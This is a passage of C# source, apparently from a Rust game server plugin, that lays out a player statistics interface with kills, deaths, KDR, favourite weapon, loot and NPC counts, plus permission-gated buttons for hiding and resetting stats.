            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "14.908 -69.438", OffsetMax = "227.492 -53.162" },
                Text = { Text = GetLang("STAT_UI_INFO", player.UserIDString, statInfo.Name), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
            }, UI_USER_STAT_INFO, "INFO_USER_NICK");

            container.Add(new CuiElement
            {
                Name = "USER_AVATAR_LAYER",
                Parent = UI_USER_STAT_INFO,
                Components = {
                    new CuiRawImageComponent { Color = color },
                    new CuiRectTransformComponent {AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "15 -130", OffsetMax = "68 -77" }
                }
            });

            container.Add(new CuiElement
            {
                Name = "AVATAR_ON_STEAM",
                Parent = "USER_AVATAR_LAYER",
                Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1",  Png = GetImage(target == 0 ? player.UserIDString : target.ToString()) },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-25 -25", OffsetMax = "25 25" }
                }
            });

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "15.477 -179.883", OffsetMax = "87.323 -161.717" },
                Text = { Text = GetLang("STAT_UI_ACTIVITY", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 11, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
            }, UI_USER_STAT_INFO, "USER_ACTIVE");

            if (target == 0 && (config.settings.availabilityUse && (permission.UserHasPermission(player.UserIDString, permAvailability) ||  config.settings.dropStatUse && permission.UserHasPermission(player.UserIDString, permReset))))
            {
                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "15.477 -290.083", OffsetMax = "87.323 -271.917" },
                    Text = { Text = GetLang("STAT_UI_SETTINGS", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 11, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
                }, UI_USER_STAT_INFO, "USER_SETINGS");
            }

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "14.8 -151.281", OffsetMax = "227.38 -134.319" },
                Text = { Text = GetLang("STAT_UI_PLACE_TOP", player.UserIDString, GetTopScore(target == 0 ? player.userID : target)), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "0.8538514 0.8491456 0.8867924 1" }
            }, UI_USER_STAT_INFO, "TOP_IN_USER");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "14.69 -201.181", OffsetMax = "227.27 -184.219" },
                Text = { Text = GetLang("STAT_UI_ACTIVITY_TODAY", player.UserIDString, TimeHelper.FormatTime(TimeSpan.FromMinutes(statInfo.playedTime.PlayedToday), 5, lang.GetLanguage(player.UserIDString))), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "0.8538514 0.8491456 0.8867924 1" }
            }, UI_USER_STAT_INFO, "TODAY_ACTIVE_USER");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-382.31 79.219", OffsetMax = "-169.73 96.181" },
                Text = { Text = GetLang("STAT_UI_ACTIVITY_TOTAL", player.UserIDString, TimeHelper.FormatTime(TimeSpan.FromMinutes(statInfo.playedTime.PlayedForWipe), 5, lang.GetLanguage(player.UserIDString))), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "0.8538514 0.8491456 0.8867924 1" }
            }, UI_USER_STAT_INFO, "ALLTIME_ACTIVE_USER");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-382.31 56.919", OffsetMax = "-169.73 73.881" },
                Text = { Text = GetLang("STAT_UI_SCORE", player.UserIDString, statInfo.Score.ToString("0.0")), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "0.8538514 0.8491456 0.8867924 1" }
            }, UI_USER_STAT_INFO, "SCORE_USER");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = "-209.5 -67.825", OffsetMax = "-130.043 -53.66" },
                Text = { Text = GetLang("STAT_UI_PVP", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 11, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
            }, UI_USER_STAT_INFO, "PVP_STAT_USER");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 0.5", AnchorMax = "1 0.5", OffsetMin = "-209.505 36.618", OffsetMax = "-13.975 50.782" },
                Text = { Text = GetLang("STAT_UI_FAVORITE_WEAPON", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 11, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
            }, UI_USER_STAT_INFO, "RIFLE_FAVORITE_USER");

            #region KillStat
            container.Add(new CuiElement
            {
                Name = "KILL_STAT_PLAYER",
                Parent = UI_USER_STAT_INFO,
                Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage("6") },
                    new CuiRectTransformComponent { AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = "-209.389 -123.243", OffsetMax = "-14.469 -78.4" }
                }
            });

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "19 -7.014", OffsetMax = "97 8.414" },
                Text = { Text = titleKills, Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
            }, "KILL_STAT_PLAYER", "LABEL_KILL_AMOUNT");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 0.5", AnchorMax = "1 0.5", OffsetMin = "-98 -7.014", OffsetMax = "-16.845 8.414" },
                Text = { Text = kills.ToString(), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleRight, Color = "0.8538514 0.8491456 0.88679242835 1" }
            }, "KILL_STAT_PLAYER", "LABEL_KILL_AMOUNTTWO");
            #endregion

            #region DeathStat
            container.Add(new CuiElement
            {
                Name = "KILLSHOT_STAT_PLAYER",
                Parent = UI_USER_STAT_INFO,
                Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage("6") },
                    new CuiRectTransformComponent { AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = "-209.389 -173.691", OffsetMax = "-14.469 -128.849" }
                }
            });

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "19 -7.014", OffsetMax = "97 8.414" },
                Text = { Text = GetLang("STAT_UI_PVP_DEATH", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
            }, "KILLSHOT_STAT_PLAYER", "LABEL_KILL_AMOUNT");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 0.5", AnchorMax = "1 0.5", OffsetMin = "-98 -7.014", OffsetMax = "-16.845 8.414" },
                Text = { Text = statInfo.pVP.Deaths.ToString(), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleRight, Color = "0.8538514 0.8491456 0.8867924 1" }
            }, "KILLSHOT_STAT_PLAYER", "LABEL_KILL_AMOUNTTWO");
            #endregion

            #region KDRStat
            container.Add(new CuiElement
            {
                Name = "DEATCH_STAT_PLAYER",
                Parent = UI_USER_STAT_INFO,
                Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1",Png = GetImage("6") },
                    new CuiRectTransformComponent { AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = "-209.39 -224.721", OffsetMax = "-14.47 -179.879" }
                }
            });
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "19 -7.014", OffsetMax = "97 8.414" },
                Text = { Text = GetLang("STAT_UI_PVP_KDR", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
            }, "DEATCH_STAT_PLAYER", "LABEL_KILL_AMOUNT");
            float kdr = statInfo.pVP.Deaths == 0 ? kills : (float)Math.Round(((float)kills) / statInfo.pVP.Deaths, 2);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 0.5", AnchorMax = "1 0.5", OffsetMin = "-98 -7.014", OffsetMax = "-16.845 8.414" },
                Text = { Text = kdr.ToString(), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleRight, Color = "0.8538514 0.8491456 0.8867924 1" }
            }, "DEATCH_STAT_PLAYER", "LABEL_KILL_AMOUNTTWO");
            #endregion

            #region FavoriteWeapon
            container.Add(new CuiElement
            {
                Name = "FAVORITE_WEAPON_STAT_PLAYER",
                Parent = UI_USER_STAT_INFO,
                Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage("6") },
                    new CuiRectTransformComponent { AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = "-210.15 -324.607", OffsetMax = "-13.977 -278.569" }
                }
            });

            var weaponTop = statInfo.weapon.WeaponUsed.OrderByDescending(x => x.Value.Kills).Take(1).FirstOrDefault();
            if (weaponTop.Key != null)
            {
                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "46.321 -16.5", OffsetMax = "176.509 16.5" },
                    Text = { Text = GetLang("STAT_UI_FAVORITE_WEAPON_KILLS", player.UserIDString, weaponTop.Value.Kills, weaponTop.Value.Shots), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" }
                }, "FAVORITE_WEAPON_STAT_PLAYER", "LABEL_KILL_AMOUNT");

                container.Add(new CuiElement
                {
                    Name = "WEAPON_IMG_USER",
                    Parent = "FAVORITE_WEAPON_STAT_PLAYER",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage(weaponTop.Key) },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-88.5 -16.5", OffsetMax = "-55.5 16.5" }
                }
                });
            }
            else
            {
                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Text = { Text = GetLang("STAT_UI_FAVORITE_WEAPON_NOT_DATA", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" }
                }, "FAVORITE_WEAPON_STAT_PLAYER", "LABEL_KILL_AMOUNT");
            }
            #endregion

            #region OtherStat

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 0.5", AnchorMax = "1 0.5", OffsetMin = "-209.498 -63.383", OffsetMax = "-79.669 -49.219" },
                Text = { Text = GetLang("STAT_UI_OTHER_STAT", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 11, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
            }, UI_USER_STAT_INFO, "OTHER_STAT_LABEL");

            #endregion

            CloseLayer(player);
            CuiHelper.DestroyUi(player, "USER_STAT");
            CuiHelper.AddUi(player, container);
            CategoryStatUser(player, target);
            OtherStatUser(player, target);
            if (target == 0)
            {
                if (config.settings.dropStatUse && permission.UserHasPermission(player.UserIDString, permReset))
                    ButtonDropStat(player, statInfo);
                if (config.settings.availabilityUse && permission.UserHasPermission(player.UserIDString, permAvailability))
                    ButtonHideStat(player, statInfo);
            }
        }
        private void ButtonHideStat(BasePlayer player, PlayerInfo info)
        {
            var container = new CuiElementContainer();
            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = "0 0 0 0" },
                RectTransform = { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "13.865 -8.619", OffsetMax = "160.34 6.226" }
            }, UI_USER_STAT_INFO, "BUTTON_HIDE_STAT");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 0.5", AnchorMax = "1 0.5", OffsetMin = "-120.779 -7.423", OffsetMax = "21.525 9.815" },
                Text = { Text = GetLang("STAT_UI_HIDE_STAT", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "0.8538514 0.8491456 0.8867924 1" }
            }, "BUTTON_HIDE_STAT", "LABEL_HIDE_USER");


            if (!info.HidedStatistics)
            {
                container.Add(new CuiElement
                {
                    Name = "CHECK_BOX_HIDE",
                    Parent = "BUTTON_HIDE_STAT",
                    Components = {
                        new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage("5")},
                        new CuiRectTransformComponent { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "1.381 -6.404", OffsetMax = "14.381 6.596" }
                    }
                });
            }
            else
            {
                container.Add(new CuiElement
                {
                    Name = "CHECK_BOX_HIDE",
                    Parent = "BUTTON_HIDE_STAT",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage("4")},
                    new CuiRectTransformComponent { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "1.381 -6.404", OffsetMax = "14.381 6.596" }
                }
                });
            }
            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                Button = { Command = "UI_HandlerStat hidestat", Color = "0 0 0 0" },
                Text = { Text = "" }
            }, "BUTTON_HIDE_STAT");

            CuiHelper.DestroyUi(player, "BUTTON_HIDE_STAT");
            CuiHelper.AddUi(player, container);
        }

        private void DialogConfirmationDropStat(BasePlayer player)
        {
            var container = new CuiElementContainer();
            container.Add(new CuiElement
            {
                Name = "CONFIRMATIONS",
                Parent = UI_USER_STAT_INFO,
                Components = {
                    new CuiImageComponent { Color = "1 1 1 0.05" },
                    new CuiRectTransformComponent {AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "13.64 -104.387", OffsetMax = "160.12 -45.246" }
                }
            });

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.5 1", AnchorMax = "0.5 1", OffsetMin = "-73.24 -30", OffsetMax = "73.24 -0.43" },
                Text = { Text = GetLang("STAT_UI_CONFIRM", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 12, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" }
            }, "CONFIRMATIONS");

            container.Add(new CuiElement
            {
                Name = "CONFIRMATIONS_YES",
                Parent = "CONFIRMATIONS",
                Components = {
                    new CuiImageComponent { Color = "1 1 1 0.05"},
                    new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "0 0", OffsetMin = "11.28 6.7", OffsetMax = "46.28 23.7" }
                }
            });

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-22.5 -11", OffsetMax = "22.5 11" },
                Button = { Command = "UI_HandlerStat confirm_yes", Color = "0 0 0 0" },
                Text = { Text = GetLang("STAT_UI_CONFIRM_YES", player.UserIDString), Font = "robotocondensed-bold.ttf", FontSize = 12, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" }
            }, "CONFIRMATIONS_YES", "LABEL_YES");

            container.Add(new CuiElement
            {
                Name = "CONFIRMATIONS_NO",
                Parent = "CONFIRMATIONS",
                Components = {
                    new CuiImageComponent { Color = "1 1 1 0.05" },
                    new CuiRectTransformComponent { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-46.8 6.7", OffsetMax = "-11.8 23.7" }
                }
            });

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-22.5 -11", OffsetMax = "22.5 11" },
                Button = { Close = "CONFIRMATIONS", Color = "0 0 0 0" },
                Text = { Text = GetLang("STAT_UI_CONFIRM_NO", player.UserIDString), Font = "robotocondensed-bold.ttf", FontSize = 12, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" }
            }, "CONFIRMATIONS_NO", "LABEL_NO");

            CuiHelper.DestroyUi(player, "CONFIRMATIONS");
            CuiHelper.AddUi(player, container);
        }

        private void ButtonDropStat(BasePlayer player, PlayerInfo info)
        {
            var container = new CuiElementContainer();

            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = "0 0 0 0" },
                RectTransform = { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "13.75 -29.559", OffsetMax = "160.23 -15.727" }
            }, UI_USER_STAT_INFO, "BUTTON_REFRESH_STAT");

            container.Add(new CuiElement
            {
                Name = "USER_REFRESH_STAT",
                Parent = "BUTTON_REFRESH_STAT",
                Components = {
                    new CuiImageComponent { Color = "1 1 1 1", Sprite = "assets/icons/clear_list.png" },
                    new CuiRectTransformComponent { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "1.74 -6.5", OffsetMax = "14.74 6.5" }
                }
            });

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 0.5", AnchorMax = "1 0.5", OffsetMin = "-120.55 -6.916", OffsetMax = "21.75 8.202" },
                Text = { Text = GetLang("STAT_UI_RESET_STAT", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "0.8538514 0.8491456 0.8867924 1" }
            }, "BUTTON_REFRESH_STAT", "LABEL_REFRESH_USER");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                Button = { Command = "UI_HandlerStat confirm", Color = "0 0 0 0" },
                Text = { Text = "" }
            }, "BUTTON_REFRESH_STAT");

            CuiHelper.DestroyUi(player, "BUTTON_REFRESH_STAT");
            CuiHelper.AddUi(player, container);
        }

        private void OtherStatUser(BasePlayer player, ulong target = 0, int statType = 0)
        {
            var container = new CuiElementContainer();
            PlayerInfo statInfo = PlayerInfo.Find(target == 0 ? player.userID : target);
            if (statType == 0)
            {
                #region CrateStat
                container.Add(new CuiElement
                {
                    Name = "CRATE_STAT",
                    Parent = UI_USER_STAT_INFO,
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage("6") },
                    new CuiRectTransformComponent { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-210.146 181.391", OffsetMax = "-13.974 227.429" }
                }
                });

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "48.359 -7.014", OffsetMax = "176.509 8.414" },
                    Text = { Text = GetLang("STAT_UI_CRATE_OPEN", player.UserIDString, statInfo.otherStat.CrateOpen), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" }
                }, "CRATE_STAT");

                container.Add(new CuiElement
                {
                    Parent = "CRATE_STAT",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage("cratecostume") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-88.5 -16.5", OffsetMax = "-55.5 16.5" }
                }
                });
                #endregion

                #region BarrelStat
                container.Add(new CuiElement
                {
                    Name = "BARREL_STAT",
                    Parent = UI_USER_STAT_INFO,
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage("6") },
                    new CuiRectTransformComponent { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-210.146 129.171", OffsetMax = "-13.974 175.209" }
                }
                });

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "48.359 -7.014", OffsetMax = "176.509 8.414" },
                    Text = { Text = GetLang("STAT_UI_BARREL_KILL", player.UserIDString, statInfo.otherStat.BarrelDeath), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" }
                }, "BARREL_STAT");

                container.Add(new CuiElement
                {
                    Parent = "BARREL_STAT",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1",  Png = GetImage("barrelcostume") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-88.5 -16.5", OffsetMax = "-55.5 16.5" }
                }
                });
                #endregion

                #region AnimalKillStat
                container.Add(new CuiElement
                {
                    Name = "ANIMALKILL_STAT",
                    Parent = UI_USER_STAT_INFO,
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage("6") },
                    new CuiRectTransformComponent { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-210.146 76.951", OffsetMax = "-13.974 122.989" }
                }
                });

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "48.359 -7.014", OffsetMax = "176.509 8.414" },
                    Text = { Text = GetLang("STAT_UI_ANIMAL_KILL", player.UserIDString, statInfo.otherStat.AnimalsKill), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" }
                }, "ANIMALKILL_STAT");

                container.Add(new CuiElement
                {
                    Parent = "ANIMALKILL_STAT",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage("skull.wolf") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-88.5 -16.5", OffsetMax = "-55.5 16.5" }
                }
                });
                #endregion
            }
            else
            {
                #region HeliStat
                container.Add(new CuiElement
                {
                    Name = "Heli_STAT",
                    Parent = UI_USER_STAT_INFO,
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage("6") },
                    new CuiRectTransformComponent { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-210.146 181.391", OffsetMax = "-13.974 227.429" }
                }
                });

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "48.359 -7.014", OffsetMax = "176.509 8.414" },
                    Text = { Text = GetLang("STAT_UI_HELI_KILL", player.UserIDString, statInfo.pVP.HeliKill), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" }
                }, "Heli_STAT");

                container.Add(new CuiElement
                {
                    Parent = "Heli_STAT",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage("10") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-88.5 -16.5", OffsetMax = "-55.5 16.5" }
                }
                });
                #endregion

                #region BradleyStat
                container.Add(new CuiElement
                {
                    Name = "BRADLEY_STAT",
                    Parent = UI_USER_STAT_INFO,
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage("6") },
                    new CuiRectTransformComponent { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-210.146 129.171", OffsetMax = "-13.974 175.209" }
                }
                });

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "48.359 -7.014", OffsetMax = "176.509 8.414" },
                    Text = { Text = GetLang("STAT_UI_BRADLEY_KILL", player.UserIDString, statInfo.pVP.BradleyKill), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" }
                }, "BRADLEY_STAT");

                container.Add(new CuiElement
                {
                    Parent = "BRADLEY_STAT",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1",  Png = GetImage("11") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-88.5 -16.5", OffsetMax = "-55.5 16.5" }
                }
                });
                #endregion

                #region NpcKillStat
                container.Add(new CuiElement
                {
                    Name = "NPCKILL_STAT",
                    Parent = UI_USER_STAT_INFO,
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage("6") },
                    new CuiRectTransformComponent { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-210.146 76.951", OffsetMax = "-13.974 122.989" }
                }
                });

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "48.359 -7.014", OffsetMax = "176.509 8.414" },
                    Text = { Text = GetLang("STAT_UI_NPC_KILL", player.UserIDString, statInfo.pVP.KillsNpc), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" }
                }, "NPCKILL_STAT");

                container.Add(new CuiElement
                {
                    Name = "NPC_IMG_USER",
                    Parent = "NPCKILL_STAT",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage("scientistsuit_heavy") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-88.5 -16.5", OffsetMax = "-55.5 16.5" }
                }
                });
                #endregion
            }

            container.Add(new CuiButton
            {
                Button = { Color = "1 1 1 0.1", Command = $"UI_HandlerStat ShowMoreStat {target} {statType}" },
                Text = { Text = GetLang("STAT_UI_BTN_MORE", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleCenter, Color = "0.8538514 0.8491456 0.8867924 1" },
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "186.97 -254.682", OffsetMax = "383.15 -233.6" }
            }, UI_USER_STAT_INFO, "SHOW_MORE_STAT");

            CuiHelper.DestroyUi(player, "SHOW_MORE_STAT");
            CuiHelper.DestroyUi(player, "CRATE_STAT");
            CuiHelper.DestroyUi(player, "BARREL_STAT");
            CuiHelper.DestroyUi(player, "NPCKILL_STAT");
            CuiHelper.DestroyUi(player, "Heli_STAT");
            CuiHelper.DestroyUi(player, "BRADLEY_STAT");
            CuiHelper.DestroyUi(player, "ANIMALKILL_STAT");
            CuiHelper.AddUi(player, container);
        }

        #region CategoryAndStat
       
        private void CategoryStatUser(BasePlayer player, ulong target = 0, int cat = 0)
        {
            var container = new CuiElementContainer();
            PlayerInfo statInfo = PlayerInfo.Find(target == 0 ? player.userID : target);
            var list = GetCategory(statInfo, cat);
            #region line
            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = "0.5803922 0.572549 0.6117647 0.4313726" },
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = $"151.69 {181.046 - ((list.Count - 1) * 50.729)}", OffsetMax = $"153.21 225.49" }
            }, UI_USER_STAT_INFO, "STAT_LINE");

            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = "0.5803922 0.572549 0.6117647 1" },
                RectTransform = { AnchorMin = "0.5 1", AnchorMax = "0.5 1", OffsetMin = $"-0.761 {-23.343 - ((list.Count - 1) * 30.729)}", OffsetMax = "0.761 0.17" }
            }, "STAT_LINE", "STAT_LINE_CHILD");
            #endregion

            #region USER STAT BUTTON CATEGORY
            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = "0 0 0 0" },
                RectTransform = { AnchorMin = "0.5 1", AnchorMax = "0.5 1", OffsetMin = "-146.988 -71.4", OffsetMax = "146.388 -53.16" }
            }, UI_USER_STAT_INFO, "MENU_USER_STAT");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "0.312 -9.12", OffsetMax = "84.704 9.121" },
                Button = { Command = $"UI_HandlerStat changeCategory {target} 0", Color = "0 0 0 0" },
                Text = { Text = GetLang("STAT_UI_CATEGORY_GATHER", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleCenter, }
            }, "MENU_USER_STAT", "Panel_5655");

            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = cat == 0 ? "0.2988604 0.6886792 0.120194 0.6431373" : "0 0 0 0" },
                RectTransform = { AnchorMin = "0.5 0", AnchorMax = "0.5 0", OffsetMin = "-42.347 0", OffsetMax = "42.196 1.871" }
            }, "Panel_5655", "Panel_8052");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-61.983 -9.121", OffsetMax = "31.232 9.12" },
                Button = { Command = $"UI_HandlerStat changeCategory {target} 1", Color = "0 0 0 0" },
                Text = { Text = GetLang("STAT_UI_CATEGORY_EXPLOSED", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleCenter, }
            }, "MENU_USER_STAT", "Panel_56551");

            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = cat == 1 ? "0.2988604 0.6886792 0.120194 0.6431373" : "0 0 0 0" },
                RectTransform = { AnchorMin = "0.5 0", AnchorMax = "0.5 0", OffsetMin = "-46.608 0", OffsetMax = "46.608 1.871" }
            }, "Panel_56551", "Panel_8052");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "1 0.5", AnchorMax = "1 0.5", OffsetMin = "-115.459 -9.12", OffsetMax = "0.001 9.121" },
                Button = { Command = $"UI_HandlerStat changeCategory {target} 2", Color = "0 0 0 0" },
                Text = { Text = GetLang("STAT_UI_CATEGORY_PLANT", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleCenter, }
            }, "MENU_USER_STAT", "Panel_56553");

